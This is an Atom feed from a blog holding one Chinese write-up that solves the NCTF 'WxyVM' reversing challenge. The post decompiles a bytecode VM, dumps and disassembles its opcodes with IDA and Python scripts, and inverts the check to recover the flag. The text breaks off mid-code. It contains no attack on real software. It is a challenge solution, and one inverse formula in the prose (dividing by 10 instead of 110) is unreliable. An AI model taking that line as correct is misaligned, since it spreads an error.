<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mutou-jun&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-15T13:48:47.821Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>木头</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nctf WxyVM</title>
    <link href="http://yoursite.com/2019/10/14/Nctf%20WxyVM/"/>
    <id>http://yoursite.com/2019/10/14/Nctf WxyVM/</id>
    <published>2019-10-14T13:48:29.000Z</published>
    <updated>2019-10-15T13:48:47.821Z</updated>
    
    <content type="html"><![CDATA[<p>前十多天，初学pwn，导致一直没有看逆向，而前两天遇到个VM题，一点思路没有，于是开始来学习下VMProtect；这道题终于算是有了个了解，觉得自己汇编有点差劲呢！<br>VMProtetct 的题太好时间了，//尽管这可能并算不上难题，因为这里面还没有垃圾代码以及多余判断，<br>第一次做VM，记录下</p><a id="more"></a><h1 id="了解VMProtect"><a href="#了解VMProtect" class="headerlink" title="了解VMProtect"></a>了解VMProtect</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=713219</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/27067133</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/28176139</span><br><span class="line"></span><br><span class="line">https://www.freebuf.com/column/174623.html</span><br><span class="line"></span><br><span class="line">github之VMProtect：</span><br><span class="line">https://github.com/lmy375/awesome-vmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">本题参考wp：</span><br><span class="line">http://radishes.top/2018/12/11/2018-12-11-%E9%80%86%E5%90%91VM%E7%B1%BB%E5%9E%8B/</span><br><span class="line"></span><br><span class="line">https://www.itread01.com/content/1543881789.html</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/10/15/KPdiPs.png" alt="KPdiPs.png"></p><h3 id="进入main-函数"><a href="#进入main-函数" class="headerlink" title="进入main()函数;"></a>进入main()函数;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  printf(&quot;This is a %s\nplz input your flag:&quot;, aWcyvm1);// </span><br><span class="line">                                                // This is a WcyVM1</span><br><span class="line">                                                // plz input your flag:</span><br><span class="line">  if ( (unsigned int)sub_400DB7() )             // sub_400DB7是 一个 VM虚拟机</span><br><span class="line">    puts(&quot;flag is your input&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;didixingwei&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>主函数中没有什么特别的</p></blockquote><h3 id="进去分析下-sub-400DB7"><a href="#进去分析下-sub-400DB7" class="headerlink" title="进去分析下 sub_400DB7"></a>进去分析下 sub_400DB7</h3><blockquote><p>函数内部我已经重命名了，方便我们理解，另外下面  类似这样的代码 [VM_EIP[1] - 1]   真实的意思 是     zijiema[VM_EIP+1]-1  (VM_EIP指向相当于cpu中的rip)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 sub_400DB7()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-54h]</span><br><span class="line">  void *zijiema; // [rsp+10h] [rbp-50h]</span><br><span class="line">  char *v3; // [rsp+18h] [rbp-48h]</span><br><span class="line">  int *R[0]; // [rsp+20h] [rbp-40h]</span><br><span class="line">  int *R1; // [rsp+28h] [rbp-38h]</span><br><span class="line">  int *R2; // [rsp+30h] [rbp-30h]</span><br><span class="line">  int *R3; // [rsp+38h] [rbp-28h]</span><br><span class="line">  char *VM_RSP; // [rsp+40h] [rbp-20h]</span><br><span class="line">  char *v9; // [rsp+48h] [rbp-18h]</span><br><span class="line">  _DWORD *VM_EIP; // [rsp+50h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v11; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  v1 = 0;</span><br><span class="line">  zijiema = malloc(0x200uLL);</span><br><span class="line">  v3 = (char *)malloc(0x1400uLL);</span><br><span class="line">  memset(&amp;R[0], 0, 0x30uLL);</span><br><span class="line">  memcpy(zijiema, dword_6021C0, 0x190uLL);      // &amp;unk_6021C0指针  是VMP字节码：VM_DATA（有点相当于CPU中的每个指令）   </span><br><span class="line">  R[0] = (int *)malloc(0x38uLL);                // 初始化 虚拟机，保存物理寄存器到  虚拟机寄存器数组VM_CONTEXT;这里我们重命名为R[0],方便读阅</span><br><span class="line">                                                // 而 CMP中的 EDI寄存器中存储的地址，就是虚拟机寄存器数组的起始地址；</span><br><span class="line">                                                // rax     R0</span><br><span class="line">  R1 = R[0] + 1;                                // rbx     R1</span><br><span class="line">  R2 = R[0] + 2;                                // rcx     R2</span><br><span class="line">  R3 = R[0] + 3;                                // R3</span><br><span class="line">  VM_RSP = v3 + 5120;                           // RBP   相当于 VMP中的栈顶   </span><br><span class="line">  v9 = v3 + 5120;                               // rbp</span><br><span class="line">  VM_EIP = zijiema;                             // VM_EIP (VMP中的ESI寄存器) 指向 VMP字节码的某个地址，起初让其指向VMP的首指针，</span><br><span class="line">                                                // 所以，可以推断处  V10 是VM_EIP</span><br><span class="line">LABEL_26:</span><br><span class="line">  while ( *VM_EIP )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( (char)*VM_EIP )                    // 每有一个case 就对应一个 Handler </span><br><span class="line">    &#123;</span><br><span class="line">      case 8:                                   // mov R[VM_EIP[1]-1] =  VM_EIP[2]  ;  VM_EIP+=3*4  </span><br><span class="line">                                                // 其实这里   VM_EIP可以相当于是 i   即 i+=3*12</span><br><span class="line">        sub_40082B((&amp;R[0])[VM_EIP[1] - 1], VM_EIP[2], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 9:                                   // pop R[VM_EIP[i+1]-1];  VM_EIP 即 i=i+2*4</span><br><span class="line">        sub_40096D((&amp;R[0])[VM_EIP[1] - 1], (_DWORD **)&amp;VM_RSP, &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 10:                                  // push R[VM_EIP[i+1]-1];   i=i+2*4</span><br><span class="line">        sub_400927((&amp;R[0])[VM_EIP[1] - 1], &amp;VM_RSP, &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 11:                                  // R0=getchar();i+=1*4</span><br><span class="line">        sub_4009B3(R[0], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 12:                                  // putchar(R0)  ;i+=1*4</span><br><span class="line">        sub_4009E5(R[0], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 13:</span><br><span class="line">        sub_400B5D(&amp;v1, (&amp;R[0])[VM_EIP[1] - 1], (&amp;R[0])[VM_EIP[2] - 1], &amp;VM_EIP);// 有点多  见里面注释吧，然后 i+=3*4</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 14:</span><br><span class="line">        sub_400A34(&amp;VM_EIP, VM_EIP[1], (__int64)zijiema);// jump i+1</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 15:                                  // if    v1==0x80   jump i+=2*4</span><br><span class="line">                                                // else  jump i= 4*(i+1)</span><br><span class="line">        sub_400AAF(v1, (signed __int64 *)&amp;VM_EIP, VM_EIP[1], (__int64)zijiema);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 16:</span><br><span class="line">        sub_400A61(v1, (signed __int64 *)&amp;VM_EIP, VM_EIP[1], (__int64)zijiema);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 17:</span><br><span class="line">        sub_400AFD((&amp;R[0])[VM_EIP[1] - 1], &amp;VM_EIP);// r0++; i+=2*4</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 18:</span><br><span class="line">        sub_400B2D((&amp;R[0])[VM_EIP[1] - 1], &amp;VM_EIP);// r0--; i+=2*4</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 19:</span><br><span class="line">        sub_400C0E((&amp;R[0])[VM_EIP[1] - 1], VM_EIP[2], &amp;VM_EIP);// r0+=VM_EIP[i+2]   i=3*4</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 20:                                  // 两个寄存器  相加    i+=3*4</span><br><span class="line">        sub_400C43((&amp;R[0])[VM_EIP[1] - 1], (&amp;R[0])[VM_EIP[2] - 1], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 21:                                  // 寄存器  等于  寄存器^( i+2)      ；i=i+3</span><br><span class="line">        sub_400C7C((&amp;R[0])[VM_EIP[1] - 1], VM_EIP[2], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 22:                                  // 寄存器等于寄存器  &amp;寄存器     i+=12</span><br><span class="line">        sub_400CB1((&amp;R[0])[VM_EIP[1] - 1], (&amp;R[0])[VM_EIP[2] - 1], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 23:                                  // 寄存器等于寄存器  | 寄存器     i+=12</span><br><span class="line">        sub_400CEA((&amp;R[0])[VM_EIP[1] - 1], (&amp;R[0])[VM_EIP[2] - 1], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 25:                                  // 寄存器左  =寄存器（右）    i+=12</span><br><span class="line">        sub_400858((&amp;R[0])[VM_EIP[1] - 1], (&amp;R[0])[VM_EIP[2] - 1], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 26:                                  // 寄存器左  =寄存器（右）的地址    i+=12</span><br><span class="line">        sub_400889((&amp;R[0])[VM_EIP[1] - 1], (unsigned __int64)(&amp;R[0])[VM_EIP[2] - 1], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 27:                                  // 将第二个寄存器中存的地址中的值传给第一个寄存器  i+=12</span><br><span class="line">        sub_4008BA((&amp;R[0])[VM_EIP[1] - 1], (unsigned int *)(&amp;R[0])[VM_EIP[2] - 1], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 28:                                  // // 将第二个寄存器中存的指针所指向的值传给第一个寄存器</span><br><span class="line">        sub_4008EF((unsigned int *)(&amp;R[0])[VM_EIP[1] - 1], (&amp;R[0])[VM_EIP[2] - 1], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 29:                                  // 寄存器*=(i+2)</span><br><span class="line">        sub_400D23((&amp;R[0])[VM_EIP[1] - 1], VM_EIP[2], &amp;VM_EIP);</span><br><span class="line">        goto LABEL_26;</span><br><span class="line">      case 100:</span><br><span class="line">        return sub_400D59((__int64)v9);</span><br><span class="line">      default:</span><br><span class="line">        sub_400A17(&amp;VM_EIP);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面函数详细见 注释：（分析了好久好久，汇编有些弱），接下来我们找下虚拟机字节码在呢，我们可分析知 在dword_6021C0指向地址处</p></blockquote><h4 id="ida脚本把字节码跑出来"><a href="#ida脚本把字节码跑出来" class="headerlink" title="ida脚本把字节码跑出来"></a>ida脚本把字节码跑出来</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auto i,start,end;//,num;</span><br><span class="line">start = 0x6021C0;</span><br><span class="line">end = 0x602350;</span><br><span class="line">Message(&quot;\n---------\n&quot;);</span><br><span class="line">for(i=start;i&lt;end;i=i+4)</span><br><span class="line">&#123;</span><br><span class="line">Message(&quot;0x%x,&quot;,Dword(i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x8,0x1,0x0,0x8,0x3,0x46,0xe,0x15,0xa,0x1,0x9,0x2,0xb,0xa,0x1,0xa,0x2,0x9,0x1,0x11,0x1,0xd,0x1,0x3,0xf,0x8,0x8,0x1,0x0,0x8,0x3,0x47,0xe,0x46,0xa,0x1,0x1a,0x2,0x6,0x1d,0x1,0x4,0x14,0x2,0x1,0x19,0x1,0x2,0x1b,0x1,0x1,0x1d,0x1,0x6e,0x13,0x1,0x63,0x15,0x1,0x74,0x13,0x1,0x66,0x1c,0x2,0x1,0x9,0x1,0x11,0x1,0xd,0x1,0x3,0xf,0x22,0x64,</span><br><span class="line"></span><br><span class="line">//后面是多输出的，不过可忽略！  取上面就好！</span><br><span class="line">0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,</span><br></pre></td></tr></table></figure><h4 id="gt-我们通过分析-每个case对应的handler，这里我们只将-case-100-和default之外的handler-转换为-汇编代码，"><a href="#gt-我们通过分析-每个case对应的handler，这里我们只将-case-100-和default之外的handler-转换为-汇编代码，" class="headerlink" title="&gt; 我们通过分析 每个case对应的handler，这里我们只将  case 100  和default之外的handler 转换为   汇编代码，"></a>&gt; 我们通过分析 每个case对应的handler，这里我们只将  case 100  和default之外的handler 转换为   汇编代码，</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">arr = [0x8,0x1,0x0,0x8,0x3,0x46,0xe,0x15,0xa,0x1,</span><br><span class="line">     0x9,0x2,0xb,0xa,0x1,0xa,0x2,0x9,0x1,0x11,</span><br><span class="line">     0x1,0xd,0x1,0x3,0xf,0x8,0x8,0x1,0x0,0x8,0x3,</span><br><span class="line">     0x47,0xe,0x46,0xa,0x1,0x1a,0x2,0x6,0x1d,</span><br><span class="line">     0x1,0x4,0x14,0x2,0x1,0x19,0x1,0x2,0x1b,</span><br><span class="line">     0x1,0x1,0x1d,0x1,0x6e,0x13,0x1,0x63,0x15,</span><br><span class="line">     0x1,0x74,0x13,0x1,0x66,0x1c,0x2,0x1,0x9,</span><br><span class="line">     0x1,0x11,0x1,0xd,0x1,0x3,0xf,0x22,0x64]</span><br><span class="line">i = 0</span><br><span class="line">while(i &lt; len(arr)):</span><br><span class="line">    if(arr[i] == 8):</span><br><span class="line">        print(&apos;%d   mov R%d, %d&apos;%(i, arr[i+1]-1, arr[i+2]))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 9):</span><br><span class="line">        print(&apos;%d   pop R%d&apos;%(i, arr[i+1]-1))</span><br><span class="line">        i += 2</span><br><span class="line">    if(arr[i] == 10):</span><br><span class="line">        print(&apos;%d   push R%d&apos;%(i, arr[i+1]-1))</span><br><span class="line">        i += 2</span><br><span class="line">    if(arr[i] == 11):</span><br><span class="line">        print(&apos;%d   R0 = getchar()&apos;%i)</span><br><span class="line">        i += 1</span><br><span class="line">    if(arr[i] == 12):</span><br><span class="line">        print(&apos;%d   R0  = putchar()&apos;%i)</span><br><span class="line">        i += 1</span><br><span class="line">    if(arr[i] == 13):</span><br><span class="line">        print(&quot;     cmp R%d, R%d\n&quot;%(arr[i+1]-1, arr[i+2]-1),</span><br><span class="line">              &quot;    jnz %d\n&quot;%(i+3),</span><br><span class="line">              &quot;    mov a, 80&quot;)</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 14):</span><br><span class="line">        print(&apos;%d   jmp %d&apos;%(i,arr[i+1]))</span><br><span class="line">        i +=2</span><br><span class="line">    if(arr[i] == 15):</span><br><span class="line">        print(&quot;%d&quot;%i,</span><br><span class="line">              &quot; and a, 0x80\n&quot;</span><br><span class="line">              &quot;     test a\n&quot;</span><br><span class="line">              &quot;     jnz %d&quot;%arr[i+1])</span><br><span class="line">        i += 2</span><br><span class="line">    if(arr[i] == 16):</span><br><span class="line">        print(&quot;%d&quot;%i,</span><br><span class="line">              &quot; and a, 0x80\n&quot;</span><br><span class="line">              &quot;     test a\n&quot;,</span><br><span class="line">              &quot;     jnz %d&quot;%arr[i+2])</span><br><span class="line">        i += 2    </span><br><span class="line">    if(arr[i] == 17):</span><br><span class="line">        print(&apos;%d   inc R%d&apos;%(i,arr[i+1]-1))</span><br><span class="line">        i += 2</span><br><span class="line">    if(arr[i] == 18):</span><br><span class="line">        print(&apos;%d   dec R%d&apos;%(i,arr[i+1]-1))</span><br><span class="line">        i += 2</span><br><span class="line">    if(arr[i] == 19):</span><br><span class="line">        print(&quot;%d   add R%d, %d&quot;%(i, arr[i+1]-1, arr[i+2]))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 20):</span><br><span class="line">        print(&apos;%d   sub R%d, R%d&apos;%(i, arr[i+1]-1, arr[i+2] - 1))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 21):</span><br><span class="line">        print(&apos;%d   xor R%d, %d&apos;%(i, arr[i+1]-1, arr[i+2]))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 22):</span><br><span class="line">        print(&apos;%d   and R%d, R%d&apos;%(i, arr[i+1]-1, arr[i+2]-1))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 23):</span><br><span class="line">        print(&apos;%d   or R%d, R%d&apos;%(i, arr[i+1]-1, arr[i+2]-1))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 25):</span><br><span class="line">        print(&apos;%d   mov R%d, R%d&apos;%(i, arr[i+1]-1, arr[i+2]-1))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 26):</span><br><span class="line">        print(&apos;%d   mov R%d, R%d&apos;%(i, arr[i+1]-1, arr[i+2]-1))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 27):</span><br><span class="line">        print(&apos;%d   mov R%d, [R%d]&apos;%(i, arr[i+1]-1, arr[i+2]-1))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 28):</span><br><span class="line">        print(&apos;%d   mov [R%d], R%d&apos;%(i, arr[i+1]-1, arr[i+2]-1))</span><br><span class="line">        i += 3</span><br><span class="line">    if(arr[i] == 29):</span><br><span class="line">        print(&apos;%d   mul R%d, %d&apos;%(i, arr[i+1]-1, arr[i+2]))</span><br><span class="line">        i += 3</span><br></pre></td></tr></table></figure><h4 id="执行结果（我们稍加加入一些理解性的注释）"><a href="#执行结果（我们稍加加入一些理解性的注释）" class="headerlink" title="执行结果（我们稍加加入一些理解性的注释）"></a>执行结果（我们稍加加入一些理解性的注释）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0   mov R0, 0</span><br><span class="line">3   mov R2, 70</span><br><span class="line">6   jmp 21_____________________________________________________</span><br><span class="line">8   push R0//下面这些代码是获取  70字符的输入</span><br><span class="line">10   pop R1</span><br><span class="line">12   R0 = getchar()</span><br><span class="line">13   push R0</span><br><span class="line">15   push R1</span><br><span class="line">17   pop R0</span><br><span class="line">19   inc R0</span><br><span class="line">21     cmp R0, R2</span><br><span class="line">   jnz 24</span><br><span class="line">   mov a, 80</span><br><span class="line">24 and a, 0x80</span><br><span class="line"> test a</span><br><span class="line"> jnz 8</span><br><span class="line">26   mov R0, 0</span><br><span class="line">29   mov R2, 71</span><br><span class="line">32   jmp 70________________________________________________________________</span><br><span class="line">34   push R0</span><br><span class="line">36   mov R1, R5</span><br><span class="line">39   mul R0, 4</span><br><span class="line">42   sub R1, R0</span><br><span class="line">45   mov R0, R1</span><br><span class="line">48   mov R0, [R0]_________________________________________________________</span><br><span class="line">51   mul R0, 110</span><br><span class="line">54   add R0, 99</span><br><span class="line">57   xor R0, 116这四行代码 即关键算法是 ： (((R0*110）+99)^116)+102</span><br><span class="line">60   add R0, 102_________________________________________________________</span><br><span class="line">63   mov [R1], R0</span><br><span class="line">66   pop R0</span><br><span class="line">68   inc R0</span><br><span class="line">(&apos;     cmp R0, R2\n&apos;, &apos;    jnz 73\n&apos;, &apos;    mov a, 80&apos;)</span><br><span class="line">(&apos;73&apos;, &apos; and a, 0x80\n     test a\n     jnz 34&apos;)</span><br></pre></td></tr></table></figure><h4 id="我们再分析下-case-100："><a href="#我们再分析下-case-100：" class="headerlink" title="我们再分析下  case 100："></a>我们再分析下  case 100：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall sub_400D59(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; // [rsp+10h] [rbp-8h]</span><br><span class="line">  int v3; // [rsp+14h] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 69; ++i )</span><br><span class="line">    v3 |= word_6020A0[i] != *(_DWORD *)(4LL * i - 280 + a1);</span><br><span class="line">  return v3 == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0 | 任何都等于任何，所以    v3=word_6020A0指向的数据</p></blockquote><h4 id="我们用ida将它跑出来"><a href="#我们用ida将它跑出来" class="headerlink" title="我们用ida将它跑出来"></a>我们用ida将它跑出来</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14035,11007,10955,11157,11157,11157,5791,6253,6359,5649,6359,11157,11299,11433,5649,5649,6359,11007,6217,6395,10955,10865,5941,6359,5649,10955,5597,6359,11299,5791,5597,11157,5791,5483,6253,11007,5649,5649,5597,11007,11299,10955,5597,5597,6253,6217,11157,5483,5941,6395,6395,10865,11007,5941,11299,5597,6359,10865,6359,6359,11299,11007,5483,11299,5791,13743,11433,12981,11007,12345,0,0,</span><br></pre></td></tr></table></figure><blockquote><p>其实我在  分析 汇编时  发现  上面的执行结果，有一些读不通，但主要意思已经明显了，<br>其实我在  分析 汇编时  发现  上面的执行结果，有一些读不通，但主要意思已经明显了，<br>我们输入的字符串（需要逆推出来的flag）通过关键运算 后 要与 v3相等，</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(((R0*110）+99)^116)+102=V3的逆算法为：R0=（((v3-102)^116)-99）/10</span><br></pre></td></tr></table></figure><blockquote><p>于是写  python脚本：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v3=[14035,11007,10955,11157,11157,11157,5791,6253,6359,5649,6359,11157,11299,11433,5649,5649,6359,11007,6217,6395,10955,10865,5941,6359,5649,10955,5597,6359,11299,5791,5597,11157,5791,5483,6253,11007,5649,5649,5597,11007,11299,10955,5597,5597,6253,6217,11157,5483,5941,6395,6395,10865,11007,5941,11299,5597,6359,10865,6359,6359,11299,11007,5483,11299,5791,13743,11433,12981,11007,12345]</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line"></span><br><span class="line">#print len(v3)#70</span><br><span class="line">for i in range(len(v3)):</span><br><span class="line">flag+=chr((((v3[i]-102)^116)-99)/110)</span><br><span class="line">#print flag</span><br><span class="line">print flag[::-1]</span><br><span 